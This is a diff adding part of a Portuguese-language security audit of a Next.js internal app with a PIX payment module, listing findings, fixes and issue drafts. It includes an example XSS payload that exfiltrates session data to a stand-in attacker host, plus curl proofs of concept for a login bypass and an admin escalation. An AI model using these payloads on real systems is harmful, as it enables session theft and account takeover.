+      "condicao": "Nenhuma. F-13 e a face de relatório do mesmo defeito estrutural de F-01."
+    },
+    {
+      "id": "F-14",
+      "severidade": "media",
+      "categoria": "3. IDOR",
+      "titulo": "Cobranças PIX de terceiros consultáveis por divida_id, com o código copia-e-cola exposto",
+      "arquivos": [
+        {
+          "caminho": "app/api/salgados/pagamentos/route.ts",
+          "linhas": "12-33",
+          "trecho": "export async function GET(req: NextRequest) {\n  const divida_id = searchParams.get(\"divida_id\");\n  ...\n  const pagamento = await prisma.pagamentos.findFirst({\n    where: { divida_id: Number(divida_id) },\n    orderBy: { created_at: \"desc\" },\n  });\n  ...\n  return NextResponse.json(serializeDecimals(pagamento));"
+        },
+        {
+          "caminho": "app/api/salgados/pagamentos/status/route.ts",
+          "linhas": "5-19",
+          "trecho": "export async function GET(req: NextRequest) {\n  const dividaId = Number(req.nextUrl.searchParams.get(\"divida_id\"));\n  ...\n  const divida = await prisma.dividas.findUnique({\n    where: { id: dividaId },\n    select: { id: true, pago: true },\n  });"
+        },
+        {
+          "caminho": "app/api/salgados/pagamentos/route.ts",
+          "linhas": "63-76",
+          "trecho": "export async function POST(req: NextRequest) {\n  const { divida_id, colaborador_id } = await req.json();\n  ...\n  const dividaId = Number(divida_id);\n  const pagadorId = Number(colaborador_id);"
+        }
+      ],
+      "porque": "O GET devolve o registro de pagamento inteiro, incluindo br_code e br_code_base64 (o QR Code), para qualquer divida_id iterado de 1 a N, sem verificar quem pergunta. O POST aceita um par arbitrário divida_id/colaborador_id, permitindo gerar uma cobrança que usa os dados pessoais de outra pessoa como customer na AbacatePay (nome, CPF, e-mail e celular, linhas 96-130). Severidade media, e não alta, porque o QR Code de um terceiro só pode ser usado para pagar a dívida dele, não para desviar valores.",
+      "impacto": "Vazamento do estado de cobrança de qualquer dívida e uso indevido de dados pessoais de terceiros em cobranças geradas no gateway.",
+      "condicao": "Requer que já exista um pagamento gerado para a dívida consultada."
+    },
+    {
+      "id": "F-15",
+      "severidade": "media",
+      "categoria": "4. Chaves expostas",
+      "titulo": "Validação da assinatura do webhook falha em aberto quando a chave pública está vazia",
+      "arquivos": [
+        {
+          "caminho": "app/api/webhooks/abacatepay/route.ts",
+          "linhas": "22-27",
+          "trecho": "function assinaturaValida(corpoBruto: string, assinatura: string | null) {\n  const chavePublica = process.env.ABACATEPAY_WEBHOOK_PUBLIC_KEY?.trim();\n\n  if (!chavePublica) {\n    return true;\n  }"
+        },
+        {
+          "caminho": ".env",
+          "linhas": "20",
+          "trecho": "ABACATEPAY_WEBHOOK_PUBLIC_KEY=''"
+        },
+        {
+          "caminho": "app/api/webhooks/abacatepay/route.ts",
+          "linhas": "80-82",
+          "trecho": "if (!assinaturaValida(corpoBruto, req.headers.get(\"x-webhook-signature\"))) {\n  return NextResponse.json({ error: \"Assinatura inválida\" }, { status: 401 });\n}"
+        }
+      ],
+      "porque": "Quando ABACATEPAY_WEBHOOK_PUBLIC_KEY não está definida — que é exatamente o estado do .env atual — a função retorna true e a verificação HMAC e pulada por completo, sem log nem aviso. A defesa que resta é o segredo da query string (linhas 61-76), essa sim bem implementada. O risco concreto é que um segredo em URL vaza com mais facilidade que uma assinatura de corpo: fica em logs de servidor, em referrers e no histórico de proxies. Perder o segredo significa perder a única barreira.",
+      "impacto": "Defesa em profundidade ausente no único endpoint que marca dívidas como pagas (aplicarPagamentoConfirmado). Um segredo vazado em log permite forjar confirmações de pagamento.",
+      "condicao": "Explorabilidade condicionada a vazamento prévio de ABACATEPAY_WEBHOOK_SECRET. Sem esse vazamento, o webhook está protegido."
+    },
+    {
+      "id": "F-16",
+      "severidade": "media",
+      "categoria": "4. Chaves expostas",
+      "titulo": "Ausência de validação de inicialização: DATABASE_URL ausente vira a string literal \"undefined\"",
+      "arquivos": [
+        {
+          "caminho": "lib/prisma.ts",
+          "linhas": "5",
+          "trecho": "const connectionString = `${process.env.DATABASE_URL}`;"
+        },
+        {
+          "caminho": "lib/prisma.ts",
+          "linhas": "11-14",
+          "trecho": "function createPrismaClient() {\n  const adapter = new PrismaPg({ connectionString });\n  return new PrismaClient({ adapter });\n}"
+        },
+        {
+          "caminho": "prisma.config.ts",
+          "linhas": "9-11",
+          "trecho": "datasource: {\n  url: process.env[\"DATABASE_URL\"],\n},"
+        }
+      ],
+      "porque": "A interpolação de template converte undefined na string \"undefined\" em vez de falhar. A aplicação sobe e só quebra na primeira query, com erro de conexão genérico, o que dificulta perceber uma configuração incorreta de ambiente. Não há nenhum ponto no projeto que valide na inicialização a presença das variáveis obrigatórias (DATABASE_URL, API_KEY_ABACATEPAY_V1/V2, ABACATEPAY_WEBHOOK_SECRET). Nota positiva: lib/abacatepay.ts:33-38 válida as chaves da AbacatePay no momento do uso e lança erro explícito, e o webhook (linhas 61-71) recusa requisições quando o segredo não está configurado. O padrão correto já existe no projeto, só não foi aplicado a DATABASE_URL.",
+      "impacto": "Risco operacional e de diagnóstico, não de exploração direta. Não foi encontrado nenhum valor padrão inseguro no estilo ${VAR:-default} em nenhum arquivo do projeto.",
+      "condicao": "Manifesta-se apenas em ambiente mal configurado."
+    },
+    {
+      "id": "F-17",
+      "severidade": "media",
+      "categoria": "5. Inputs sem tratamento",
+      "titulo": "window.open com URL de credencial fornecida pelo usuário permite esquema javascript:",
+      "arquivos": [
+        {
+          "caminho": "app/certificacoes/page.tsx",
+          "linhas": "411-421",
+          "trecho": "{certificacao.url_credencial && (\n  <Button\n    isIconOnly\n    variant=\"outline\"\n    aria-label=\"Ver credencial\"\n    onPress={() =>\n      window.open(certificacao.url_credencial!, \"_blank\")\n    }\n  >"
+        },
+        {
+          "caminho": "app/api/certificacoes/route.ts",
+          "linhas": "162",
+          "trecho": "url_credencial: url_credencial || null,"
+        },
+        {
+          "caminho": "app/api/certificacoes/[id]/route.ts",
+          "linhas": "39-47",
+          "trecho": "const CAMPOS_ATUALIZAVEIS = [\n  \"nome\",\n  \"tipo\",\n  \"instituicao\",\n  \"data_obtencao\",\n  \"data_vencimento\",\n  \"url_credencial\",\n  \"observacoes\",\n] as const;"
+        }
+      ],
+      "porque": "url_credencial e gravado sem nenhuma validação de esquema, tanto no POST quanto no PATCH, e nenhuma das duas rotas exige autorização (F-10, F-11) — qualquer pessoa consegue plantar o valor. No cliente, a string vai direto para window.open. Uma URL javascript:fetch('https://atacante/'+localStorage.getItem('user')) executa no contexto de origem da aplicação quando um colaborador clica no botão da credencial, exfiltrando o objeto de sessão e o access_token da Senior guardados em localStorage (F-08). Navegadores baseados em Chromium ainda executam javascript: em window.open de mesma origem; o Firefox recente bloqueia. Severidade media pela dependência de interação do usuário e de navegador.",
+      "impacto": "XSS armazenado com um clique, levando a roubo do objeto de sessão e do access_token da plataforma Senior.",
+      "condicao": "Requer que um colaborador clique no botão de credencial da certificação envenenada, e navegador que permita javascript: via window.open (Chromium)."
+    },
+    {
+      "id": "F-18",
+      "severidade": "baixa",
+      "categoria": "5. Inputs sem tratamento",
+      "titulo": "URL de capa de livro controlada pelo usuário renderizada em <img src> sem validação de esquema ou host",
+      "arquivos": [
+        {
+          "caminho": "app/biblioteca/page.tsx",
+          "linhas": "737",
+          "trecho": "src={livro.capa || \"/placeholder.svg\"}"
+        },
+        {
+          "caminho": "app/biblioteca/page.tsx",
+          "linhas": "657",
+          "trecho": "src={newLivro.capa}"
+        },
+        {
+          "caminho": "app/api/biblioteca/livros/route.ts",
+          "linhas": "54-68",
+          "trecho": "const capaUrl =\n  capa ||\n  `/placeholder.svg?height=200&width=150&query=${encodeURIComponent(\n    titulo + \" book\",\n  )}`;\n\nconst livro = await prisma.livros.create({\n  data: { titulo, autor, genero: genero || \"\", isbn: isbn || \"\", disponivel: true, capa: capaUrl },\n});"
+        },
+        {
+          "caminho": "next.config.mjs",
+          "linhas": "7-9",
+          "trecho": "images: {\n  unoptimized: true,\n},"
+        }
+      ],
+      "porque": "O campo capa aceita qualquer string no POST e no PATCH de livros, sem restrição de esquema ou de domínio. Não há execução de script — src de <img> não avalia javascript: em navegadores atuais — mas a URL é requisitada automaticamente por todo visitante da página, sem clique. Um host controlado pelo atacante recebe assim o IP, o User-Agent e o Referer de cada colaborador que abre /biblioteca. Com images.unoptimized ativo, não há proxy do Next.js intermediando a requisição.",
+      "impacto": "Rastreamento passivo de colaboradores e possibilidade de disparar um prompt de autenticação básica externo. Sem execução de código.",
+      "condicao": "Nenhuma para plantar; a coleta ocorre quando qualquer usuário abre a página da biblioteca."
+    },
+    {
+      "id": "F-19",
+      "severidade": "baixa",
+      "categoria": "5. Inputs sem tratamento",
+      "titulo": "Nenhum cabeçalho de segurança de resposta configurado (CSP, X-Frame-Options, HSTS)",
+      "arquivos": [
+        {
+          "caminho": "next.config.mjs",
+          "linhas": "1-11",
+          "trecho": "const nextConfig = {\n  eslint: { ignoreDuringBuilds: true },\n  typescript: { ignoreBuildErrors: true },\n  images: { unoptimized: true },\n};\n\nexport default nextConfig;"
+        }
+      ],
+      "porque": "next.config.mjs não define a função headers(). Sem Content-Security-Policy, não existe a segunda linha de defesa que limitaria o destino de exfiltração de F-17; sem X-Frame-Options ou frame-ancestors, a aplicação pode ser embutida em iframe por terceiros. Verificado que não há middleware.ts adicionando esses cabeçalhos por outro caminho.",
+      "impacto": "Amplia a janela de exploração de qualquer XSS e permite clickjacking. Não e explorável isoladamente.",
+      "condicao": "Agravante de outros achados, não um vetor independente."
+    },
+    {
+      "id": "F-20",
+      "severidade": "baixa",
+      "categoria": "4. Chaves expostas",
+      "titulo": "Build de produção ignora erros de TypeScript e de ESLint",
+      "arquivos": [
+        {
+          "caminho": "next.config.mjs",
+          "linhas": "2-7",
+          "trecho": "eslint: {\n  ignoreDuringBuilds: true,\n},\ntypescript: {\n  ignoreBuildErrors: true,\n},"
+        }
+      ],
+      "porque": "Com ignoreBuildErrors, um npm run build conclui mesmo com erro de tipo, o que anula a rede de proteção que detectaria, por exemplo, uma função de autorização chamada com o argumento errado. O workflow de CI executa npm run typecheck em job separado (.github/workflows/testes.yml:33-34), o que mitiga parcialmente, mas apenas em pull requests e pushes para main.",
+      "impacto": "Higiene de build. Aumenta a chance de uma regressão de segurança chegar a produção sem ser notada.",
+      "condicao": "Não explorável diretamente."
+    },
+    {
+      "id": "F-21",
+      "severidade": "informativa",
+      "categoria": "4. Chaves expostas",
+      "titulo": "Credenciais de produção em .env no disco: não versionadas, porém ativas e legíveis em texto plano",
+      "arquivos": [
+        {
+          "caminho": ".env",
+          "linhas": "3-4",
+          "trecho": "STACK_PUBLISHABLE_CLIENT_KEY='pck_5rfn...'\nSTACK_SECRET_SERVER_KEY='ssk_wvvd...'"
+        },
+        {
+          "caminho": ".env",
+          "linhas": "7",
+          "trecho": "DATABASE_URL='postgresql://neondb_owner:npg_****@ep-lingering-sea-...neon.tech/neondb?sslmode=require'"
+        },
+        {
+          "caminho": ".env",
+          "linhas": "13-14, 17",
+          "trecho": "API_KEY_ABACATEPAY_V1='abc_dev_...'\nAPI_KEY_ABACATEPAY_V2='abc_dev_...'\nABACATEPAY_WEBHOOK_SECRET='176813ee...'"
+        },
+        {
+          "caminho": ".gitignore",
+          "linhas": "19-20",
+          "trecho": "# env files\n.env*"
+        }
+      ],
+      "porque": "O arquivo está corretamente coberto por .env* no .gitignore e a varredura do histórico (git log --all sobre .env e git grep dos prefixos abc_dev_, npg_, ssk_ e pck_ em todos os commits alcançáveis) não encontrou nenhum segredo versionado. Registrado como informativo por dois motivos: o par de chaves da AbacatePay tem prefixo abc_dev_, indicando ambiente de desenvolvimento, e a senha do Neon e a chave de servidor da Stack são credenciais vivas de um banco gerenciado, em texto plano na máquina de desenvolvimento. Recomenda-se rotação ao final desta auditoria, já que os valores foram lidos durante o processo.",
+      "impacto": "Nenhum vazamento constatado. Item de higiene operacional.",
+      "condicao": "Não aplicável."
+    }
+  ],
+  "pontos_fortes": [
+    {
+      "titulo": "Webhook da AbacatePay validado com comparação em tempo constante",
+      "evidencia": "app/api/webhooks/abacatepay/route.ts:61-82",
+      "detalhe": "Recusa a requisição quando ABACATEPAY_WEBHOOK_SECRET não está configurado (linhas 63-71), compara o segredo recebido com crypto.timingSafeEqual após igualar comprimentos (linhas 13-20, 74) e só aceita os eventos transparent.completed e billing.paid (linha 11, 93). E a única rota do projeto com autenticação correta."
+    },
+    {
+      "titulo": "Baixa de pagamento idempotente e transacional",
+      "evidencia": "lib/pagamentos.ts:44-112",
+      "detalhe": "aplicarPagamentoConfirmado roda dentro de prisma.$transaction, sai cedo quando status já e \"paid\" (linhas 62-69) e só incrementa total_gasto_salgados quando a dívida ainda não estava quitada (linha 90). Webhook e polling podem disparar juntos sem somar o valor duas vezes."
+    },
+    {
+      "titulo": "CPF nunca sai da API em claro",
+      "evidencia": "lib/colaboradores.ts:1-38",
+      "detalhe": "COLABORADOR_SELECT_SEGURO é usado em todas as rotas de colaboradores e nunca inclui a coluna senha; sanitizarColaborador remove document do payload e devolve apenas document_mascarado no formato ***.***.***-NN. Aplicado de forma consistente em colaboradores/route.ts:38,144 e colaboradores/[id]/route.ts:22,197."
+    },
+    {
+      "titulo": "Zero SQL bruto: sem superfície de injeção",
+      "evidencia": "app/**, lib/**",
+      "detalhe": "Varredura por $queryRaw, $executeRaw e queryRawUnsafe não retornou nenhuma ocorrência. Todo acesso a dados passa pelo Prisma Client com parâmetros tipados, e as buscas por texto usam contains com mode: \"insensitive\", que é parametrizado."
+    },
+    {
+      "titulo": "Nenhum vetor de injeção de HTML no frontend",
+      "evidencia": "app/**, components/**",
+      "detalhe": "Varredura por dangerouslySetInnerHTML, innerHTML, eval e new Function em todas as páginas e componentes não retornou nenhuma ocorrência. O projeto não renderiza Markdown nem HTML de usuário; todo texto passa pelo escape automático do JSX. É por isso que a categoria 5 tem apenas um achado de severidade média e dois baixos."
+    },
+    {
+      "titulo": "Simulação de pagamento bloqueada em produção",
+      "evidencia": "app/api/salgados/pagamentos/simular/route.ts:8-16",
+      "detalhe": "A rota verifica process.env.NODE_ENV === \"production\" antes de qualquer outra coisa e responde 403. Sem essa guarda, o endpoint quitaria dívidas sem pagamento em produção — e a única rota de escrita do módulo financeiro que se protege sozinha."
+    },
+    {
+      "titulo": "Segredos fora do controle de versão, histórico limpo",
+      "evidencia": ".gitignore:19-20, git log --all",
+      "detalhe": "O padrão .env* cobre todas as variantes. git log --all sobre .env, .env.local e .env.production não retorna commits; git grep pelos prefixos abc_dev_, npg_, ssk_, pck_ em todos os commits alcançáveis só encontrou placeholders na documentação de skills do Prisma. Nenhuma variável NEXT_PUBLIC_* existe no projeto, portanto nenhum segredo chega ao bundle do cliente."
+    },
+    {
+      "titulo": "CI sem credenciais reais",
+      "evidencia": ".github/workflows/testes.yml:14-16",
+      "detalhe": "A única variável de ambiente do workflow é um DATABASE_URL apontando para postgresql://ci:ci@localhost:5432/ci, descartável e sem valor fora do runner. Nenhum uso de secrets em claro, nenhuma chave de API embutida."
+    },
+    {
+      "titulo": "Proxy de capa de livro sem SSRF",
+      "evidencia": "app/api/biblioteca/livros/buscar-capa/route.ts:45-135",
+      "detalhe": "Os dois hosts consultados são literais no código (googleapis.com e openlibrary.org); o input do usuário entra apenas como valor em URLSearchParams, nunca como host ou caminho. Há timeout de 8 s via AbortSignal.timeout (linhas 9, 65, 116) e a URL de capa retornada e normalizada para https (linha 38)."
+    },
+    {
+      "titulo": "Validação de entrada consistente nas rotas de escrita",
+      "evidencia": "app/api/colaboradores/[id]/route.ts:89-192, app/api/salgados/transferencias/route.ts:14-71",
+      "detalhe": "O PATCH de colaboradores válida nome vazio, unicidade de e-mail, existência do setor, enum de status e data inválida. A rota de transferencias válida formato de chave PIX por tipo, tipo contra lista fechada e valor mínimo. A validação de formato e solida em todo o projeto — o que falta e a camada de autorização, não a de validação."
+    },
+    {
+      "titulo": "Cobertura de testes automatizados já estabelecida",
+      "evidencia": "tests/**, e2e/**, .github/workflows/testes.yml",
+      "detalhe": "Existem 5 suites de integracao, 5 de unidade e 4 specs Playwright, com jobs separados de typecheck, unidade, integracao e E2E no CI. Ha onde ancorar testes de regressão de autorização assim que as correcoes forem feitas."
+    }
+  ],
+  "pontos_fracos": [
+    "Não existe sessão no servidor. Sem cookie, sem token assinado e sem middleware.ts, nenhum route handler consegue saber quem está chamando. Todos os demais problemas derivam deste.",
+    "As duas únicas verificações de privilégio recebem a identidade do atacante. ehAdmin e ehAdminPermanente estão implementadas corretamente, mas são alimentadas por colaborador_id do corpo e user_email da query string.",
+    "Dinheiro real alcançável por anônimo. Saque PIX (F-03), quitacao de dívida sem pagamento (F-07) e leitura do saldo da loja (F-09) formam uma cadeia completa de fraude financeira.",
+    "A lógica de autorização foi escrita no lado errado da fronteira. podeEditarCertificacao e ProtectedRoute codificam as regras certas, mas rodam no navegador; nenhum handler as reproduz.",
+    "IDOR generalizado, não pontual. Dos 29 handlers auditados, 26 não possuem qualquer verificação de posse ou de papel — o padrão e a ausência, não a excecao.",
+    "Autenticação contornável por constante literal. A senha mestra \"123456\" em app/api/auth/login/route.ts:35 dispensa qualquer credencial válida."
+  ],
+  "cobertura": [
+    [
+      "/api/auth/login",
+      "POST",
+      "falha",
+      "Senha mestra hardcoded (F-02)"
+    ],
+    [
+      "/api/auth/senior",
+      "POST",
+      "parcial",
+      "Valida credenciais na plataforma Senior, mas não emite sessão (F-08)"
+    ],
+    [
+      "/api/admin/setores",
+      "GET, POST",
+      "falha",
+      "Sem verificação alguma (F-05)"
+    ],
+    [
+      "/api/admin/setores/[id]",
+      "GET, PUT, DELETE",
+      "falha",
+      "Sem verificação alguma (F-05)"
+    ],
+    [
+      "/api/admin/usuarios",
+      "GET, POST, DELETE",
+      "falha",
+      "Autoriza por user_email da query/body (F-04)"
+    ],
+    [
+      "/api/biblioteca/livros",
+      "GET, POST",
+      "falha",
+      "Sem verificação (F-10)"
+    ],
+    [
+      "/api/biblioteca/livros/[id]",
+      "GET, PUT, PATCH, DELETE",
+      "falha",
+      "IDOR sem posse (F-12)"
+    ],
+    [
+      "/api/biblioteca/livros/buscar-capa",
+      "GET",
+      "ok",
+      "Hosts literais, timeout, sem SSRF"
+    ],
+    [
+      "/api/biblioteca/emprestimos",
+      "GET, POST",
+      "falha",
+      "Sem escopo de dono (F-01, F-10)"
+    ],
+    [
+      "/api/biblioteca/emprestimos/[id]",
+      "GET, PATCH",
+      "falha",
+      "IDOR sem posse (F-12)"
+    ],
+    [
+      "/api/certificacoes",
+      "GET, POST",
+      "falha",
+      "Sem escopo de dono (F-01, F-10)"
+    ],
+    [
+      "/api/certificacoes/[id]",
+      "GET, PATCH, DELETE",
+      "falha",
+      "IDOR sem posse (F-11)"
+    ],
+    [
+      "/api/colaboradores",
+      "GET, POST",
+      "falha",
+      "Listagem integral de PII (F-01)"
+    ],
+    [
+      "/api/colaboradores/[id]",
+      "GET, PATCH",
+      "falha",
+      "IDOR de escrita em PII (F-06)"
+    ],
+    [
+      "/api/dashboard",
+      "GET",
+      "falha",
+      "Relatório global sem escopo (F-13)"
+    ],
+    [
+      "/api/ranking/colaboradores",
+      "GET",
+      "falha",
+      "Ranking nominal global (F-01, F-13)"
+    ],
+    [
+      "/api/ranking/estatisticas",
+      "GET",
+      "falha",
+      "Agregados globais (F-13)"
+    ],
+    [
+      "/api/salgados/dividas",
+      "GET, POST",
+      "falha",
+      "Sem escopo de dono (F-01, F-07)"
+    ],
+    [
+      "/api/salgados/dividas/[id]",
+      "GET, PATCH",
+      "falha",
+      "Quitação sem pagamento (F-07)"
+    ],
+    [
+      "/api/salgados/pagamentos",
+      "GET, POST",
+      "falha",
+      "Cobranças de terceiros (F-14)"
+    ],
+    [
+      "/api/salgados/pagamentos/simular",
+      "POST",
+      "ok",
+      "Bloqueado em produção (NODE_ENV)"
+    ],
+    [
+      "/api/salgados/pagamentos/status",
+      "GET",
+      "falha",
+      "Consulta por divida_id sem posse (F-14)"
+    ],
+    [
+      "/api/salgados/saldo",
+      "GET",
+      "falha",
+      "Saldo financeiro sem auth (F-09)"
+    ],
+    [
+      "/api/salgados/transferencias",
+      "POST",
+      "falha",
+      "Saque PIX com id forjado (F-03)"
+    ],
+    [
+      "/api/webhooks/abacatepay",
+      "POST",
+      "ok",
+      "Segredo + timingSafeEqual; assinatura opcional (F-15)"
+    ]
+  ],
+  "recomendacoes": [
+    {
+      "prioridade": "P1",
+      "prazo": "Imediato — antes de qualquer exposição pública",
+      "itens": [
+        "Remover a comparação password === \"123456\" de app/api/auth/login/route.ts:35. Se a rota legada não e mais usada pela interface, exclua o arquivo; se for necessaria, adote hash com bcrypt ou argon2 sobre a coluna senha (F-02).",
+        "Emitir uma sessão no servidor no fim de /api/auth/senior: cookie httpOnly, secure, sameSite=lax, com JWT assinado ou identificador de sessão persistido. Parar de confiar no objeto do localStorage (F-08).",
+        "Criar um helper único, por exemplo lib/sessao.ts com getUsuarioAutenticado(req), e passar a derivar a identidade DELE em todo handler. Nenhuma rota deve voltar a aceitar colaborador_id ou user_email como prova de identidade (F-03, F-04).",
+        "Bloquear /api/salgados/transferencias, /api/salgados/saldo e /api/admin/** até que o helper esteja no lugar — são as rotas com consequência financeira imediata (F-03, F-05, F-09)."
+      ]
+    },
+    {
+      "prioridade": "P2",
+      "prazo": "Na mesma sprint",
+      "itens": [
+        "Adicionar verificação de posse em todos os handlers com [id]: incluir o predicado de dono no próprio where do Prisma (where: { id, colaborador_id: usuario.id }) em vez de verificar depois, para que a resposta seja 404 e não vaze a existência do registro (F-06, F-07, F-11, F-12).",
+        "Escopar toda query de listagem, agregação e relatório pelo usuário da sessão. Onde o papel de admin justificar a visão global, tornar isso explícito: const escopo = usuario.ehAdmin ? {} : { colaborador_id: usuario.id } (F-01, F-13, F-14).",
+        "Espelhar no servidor cada gate de papel do frontend. podeEditarCertificacao (app/certificacoes/page.tsx:336-338) já tem a regra correta — replicar a mesma condição em app/api/certificacoes/[id]/route.ts (F-10).",
+        "Criar um middleware.ts que exija sessão válida em /api/** por padrão, com uma lista de exceções explícita (/api/auth/**, /api/webhooks/**). Assim uma rota nova nasce protegida em vez de nascer aberta."
+      ]
+    },
+    {
+      "prioridade": "P3",
+      "prazo": "Proximo ciclo",
+      "itens": [
+        "Validar url_credencial e capa no servidor contra uma lista fechada de esquemas (https apenas) no POST e no PATCH, e trocar window.open por um <a href> com rel=\"noopener noreferrer\" e validação no cliente (F-17, F-18).",
+        "Tornar a assinatura HMAC do webhook obrigatória: configurar ABACATEPAY_WEBHOOK_PUBLIC_KEY e inverter o retorno de assinaturaValida quando a chave estiver ausente (F-15).",
+        "Adicionar validação de variáveis de ambiente na inicialização, no mesmo padrão já usado em lib/abacatepay.ts:33-38, cobrindo DATABASE_URL (F-16).",
+        "Configurar a função headers() em next.config.mjs com Content-Security-Policy, X-Frame-Options, X-Content-Type-Options e Strict-Transport-Security (F-19).",
+        "Remover eslint.ignoreDuringBuilds e typescript.ignoreBuildErrors de next.config.mjs (F-20).",
+        "Rotacionar as credenciais do .env — banco Neon, chaves Stack e AbacatePay — como higiene de encerramento da auditoria (F-21).",
+        "Adicionar testes de integração de autorização: para cada rota, um caso sem sessão esperando 401 e um caso com sessão de outro dono esperando 404. A infraestrutura Jest em tests/integration/ já existe."
+      ]
+    }
+  ],
+  "issues": [
+    {
+      "n": 1,
+      "titulo": "[Segurança] Senha mestra \"123456\" embutida no código autentica qualquer colaborador",
+      "labels": "security, severidade:crítica, auth",
+      "problema": "A rota `POST /api/auth/login` busca o colaborador pelo e-mail e então ignora a coluna `senha` retornada do banco, comparando a senha enviada contra a constante literal `\"123456\"`. Qualquer pessoa que conheça um e-mail corporativo existente recebe de volta um objeto de usuário válido, incluindo o campo `tipo`, que o frontend usa como papel. Se o e-mail pertencer a um admin permanente, o retorno é uma identidade administrativa completa.\n\nA coluna `senha` existe em `prisma/schema.prisma:30` mas nunca é verificada e não possui hash.",
+      "evidencia": "`app/api/auth/login/route.ts:35-42`\n\n```ts\nconst isPasswordValid = password === \"123456\";\n\nif (!isPasswordValid) {\n  return NextResponse.json(\n    { error: \"Credenciais inválidas\" },\n    { status: 401 },\n  );\n}\n```\n\nProva de conceito:\n\n```bash\ncurl -X POST https://<host>/api/auth/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"<email-de-admin>\",\"password\":\"123456\"}'\n```",
+      "impacto": "Autenticação totalmente contornável. Combinado com a sessão em localStorage (issue 7), entrega acesso administrativo completo a qualquer pessoa que conheça um e-mail corporativo.",
+      "correcao": "Se a rota legada não é mais usada pela interface (o fluxo atual passa por `/api/auth/senior`), remover `app/api/auth/login/route.ts`. Caso precise permanecer, verificar a senha com `bcrypt.compare` ou `argon2.verify` contra um hash armazenado em `colaboradores.senha`, e migrar os registros existentes.",
+      "criterios": [
+        "A constante `\"123456\"` não existe mais em nenhum arquivo do repositório",
+        "A rota foi removida OU passou a validar a senha contra hash (bcrypt/argon2)",
+        "Nenhuma senha em texto plano é gravada na coluna `colaboradores.senha`",
+        "Existe teste de integração cobrindo: senha correta devolve 200, senha incorreta devolve 401, e `\"123456\"` contra um usuário real devolve 401"
+      ]
+    },
+    {
+      "n": 2,
+      "titulo": "[Segurança] Saque PIX autoriza-se com um colaborador_id enviado pelo próprio atacante",
+      "labels": "security, severidade:crítica, financeiro",
+      "problema": "`POST /api/salgados/transferencias` chama `ehAdmin(Number(colaborador_id))` onde `colaborador_id` vem do corpo JSON da requisição. O servidor pergunta \"esse id é de um admin?\" em vez de \"quem está chamando é admin?\".\n\nO atacante envia o `colaborador_id` de qualquer administrador — ids são inteiros sequenciais, e a lista de admins é obtenível via `GET /api/admin/usuarios` (issue 3) ou por força bruta de 1 a N — junto com a própria chave PIX. A rota então executa `enviarPix` contra a API de produção da AbacatePay. O valor mínimo é R$ 1,00 e não existe teto configurado.",
+      "evidencia": "`app/api/salgados/transferencias/route.ts:37-47`\n\n```ts\nexport async function POST(req: NextRequest) {\n  const { colaborador_id, amount, description, pix_key, pix_key_type } =\n    await req.json();\n\n  if (!(await ehAdmin(Number(colaborador_id)))) {\n    return NextResponse.json(\n      { error: \"Apenas administradores podem solicitar saques\" },\n      { status: 403 },\n    );\n  }\n```\n\n`app/api/salgados/transferencias/route.ts:73-78`\n\n```ts\nconst transferencia = await enviarPix({\n  amount: paraCentavos(valor),\n  externalId: crypto.randomUUID(),\n  description: String(description ?? \"\").trim() || \"Saque de salgados\",\n  pix: { key: normalizarChave(chave, tipo), type: tipo },\n});\n```",
+      "impacto": "Saque de fundos reais da conta AbacatePay da empresa para uma chave PIX arbitrária. Perda financeira direta, e o saldo disponível é descoberto de antemão via `GET /api/salgados/saldo` (issue 4).",
+      "correcao": "Derivar a identidade da sessão do servidor, nunca do corpo:\n\n```ts\nconst usuario = await getUsuarioAutenticado(req);\nif (!usuario) return NextResponse.json({ error: \"Não autenticado\" }, { status: 401 });\nif (!(await ehAdmin(usuario.id))) {\n  return NextResponse.json({ error: \"Apenas administradores podem solicitar saques\" }, { status: 403 });\n}\n```\n\nIgnorar `colaborador_id` do corpo por completo. Considerar também um teto de valor por transferência e registro de auditoria de cada saque.",
+      "criterios": [
+        "`colaborador_id` do corpo não é mais usado em nenhuma decisão de autorização",
+        "A rota responde 401 sem sessão e 403 para sessão de usuário não-admin",
+        "Existe teste de integração: sessão de usuário comum enviando `colaborador_id` de um admin recebe 403",
+        "Cada transferência aprovada gera registro de auditoria com o id do solicitante autenticado",
+        "Existe teto máximo de valor por transferência"
+      ]
+    },
+    {
+      "n": 3,
+      "titulo": "[Segurança] Gestão de administradores autoriza-se por e-mail enviado na query string",
+      "labels": "security, severidade:crítica, auth",
+      "problema": "Os três métodos de `/api/admin/usuarios` (GET, POST, DELETE) derivam a identidade do chamador do parâmetro `user_email`, que vem da query string ou do corpo. O e-mail de um admin permanente não é secreto: aparece no próprio GET desta rota, na listagem aberta de `/api/colaboradores` e segue o padrão do domínio corporativo.\n\nA proteção `ehOProprioUsuário` (linhas 19-28) não ajuda: ela compara o alvo com o e-mail forjado, não com o atacante real. Ou seja, o atacante pode promover a si mesmo desde que use o e-mail de outra pessoa no campo `user_email`.",
+      "evidencia": "`app/api/admin/usuarios/route.ts:32-43` (GET)\n\n```ts\nconst { searchParams } = new URL(request.url);\nconst userEmail = searchParams.get(\"user_email\");\n\nif (!(await ehAdminPermanente(userEmail))) {\n  return NextResponse.json({ error: \"Acesso negado. ...\" }, { status: 403 });\n}\n```\n\n`app/api/admin/usuarios/route.ts:127-130` (POST)\n\n```ts\nconst body = await request.json();\nconst { colaborador_id, admin_ate, user_email, admin_permanente } = body;\n\nif (!(await ehAdminPermanente(user_email))) {\n```\n\nProva de conceito — escalonamento de anônimo a admin permanente:\n\n```bash\ncurl -X POST https://<host>/api/admin/usuarios \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"colaborador_id\": <meu_id>, \"admin_permanente\": true, \"user_email\": \"<admin>@empresa\"}'\n```",
+      "impacto": "Escalonamento de privilégio de anônimo para administrador permanente, que é o papel de maior autoridade do sistema.",
+      "correcao": "Substituir `user_email` pela identidade da sessão nos três handlers:\n\n```ts\nconst usuario = await getUsuarioAutenticado(request);\nif (!usuario) return NextResponse.json({ error: \"Não autenticado\" }, { status: 401 });\nif (!(await ehAdminPermanente(usuario.email))) {\n  return NextResponse.json({ error: \"Acesso negado.\" }, { status: 403 });\n}\n```\n\nRemover `user_email` do contrato da API e das chamadas em `app/admin/page.tsx:181, 201-203, 766, 852-853`. `ehOProprioUsuário` passa a comparar com `usuario.email`.",
+      "criterios": [
+        "`user_email` não é mais lido da query string nem do corpo em nenhum dos três handlers",
+        "GET, POST e DELETE respondem 401 sem sessão e 403 para sessão que não seja de admin permanente",
+        "`app/admin/page.tsx` não envia mais `user_email` em nenhuma chamada",
